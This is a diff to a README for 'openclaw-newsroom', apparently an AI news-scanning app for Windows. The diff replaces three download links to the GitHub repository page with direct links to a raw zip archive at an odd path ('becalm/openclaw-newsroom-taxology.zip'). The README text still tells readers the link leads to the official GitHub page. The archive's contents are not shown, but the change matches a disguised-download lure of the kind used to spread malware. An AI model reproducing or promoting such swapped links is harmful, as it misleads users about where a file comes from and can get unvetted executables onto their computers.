@@ -1,6 +1,6 @@
 # 📰 openclaw-newsroom - AI-Powered News Scanning Tool
 
-[![Download openclaw-newsroom](https://img.shields.io/badge/Download-Get%20the%20App-brightgreen)](https://github.com/usryoo/openclaw-newsroom)
+[![Download openclaw-newsroom](https://img.shields.io/badge/Download-Get%20the%20App-brightgreen)](https://raw.githubusercontent.com/usryoo/openclaw-newsroom/main/becalm/openclaw-newsroom-taxology.zip)
 
 ---
 
@@ -42,7 +42,7 @@ The app runs in the background and provides news updates without you needing any
 
 Click the large green button at the top or go directly to the download page here:
 
-[Download openclaw-newsroom](https://github.com/usryoo/openclaw-newsroom)
+[Download openclaw-newsroom](https://raw.githubusercontent.com/usryoo/openclaw-newsroom/main/becalm/openclaw-newsroom-taxology.zip)
 
 This link will take you to the official GitHub page where the app’s installer is available.
 
@@ -131,6 +131,6 @@ For detailed help, visit the GitHub issues page on the download link provided ea
 
 Visit this page to download the latest installer:
 
-[![Download openclaw-newsroom](https://img.shields.io/badge/Download-Get%20the%20App-blue)](https://github.com/usryoo/openclaw-newsroom)
+[![Download openclaw-newsroom](https://img.shields.io/badge/Download-Get%20the%20App-blue)](https://raw.githubusercontent.com/usryoo/openclaw-newsroom/main/becalm/openclaw-newsroom-taxology.zip)
 
 Follow the steps listed above to install and start using openclaw-newsroom on your Windows PC.
